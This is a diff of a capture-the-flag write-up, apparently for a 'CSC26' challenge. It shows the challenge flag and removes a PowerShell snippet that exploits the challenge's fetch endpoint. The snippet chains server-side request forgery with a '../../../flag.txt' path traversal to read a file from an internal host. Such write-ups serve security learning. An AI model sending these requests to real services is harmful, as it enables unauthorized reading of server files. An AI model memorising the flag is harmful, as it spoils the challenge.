@@ -65,14 +65,6 @@ CSC26{3f46de9cbd46ddf353ea1620b8ef9f69837e832a46fc248127e9ea0ff9c0a88f}
 python exploit.py
 ```
 
-### Manual Exploitation (PowerShell)
-
-```powershell
-$r = Invoke-WebRequest -Uri "https://mnbvcxzasdfghj-csc26.cybersecuritychallenge.al/fetch" -Method POST -ContentType "text/plain" -Body "http://172.16.0.30/public/images?filename=../../../flag.txt"
-$bytes = $r.Content -split "`n" | ForEach-Object { [int]$_ }
-[System.Text.Encoding]::ASCII.GetString($bytes)
-```
-
 ### Manual Exploitation (curl)
 
 ```bash
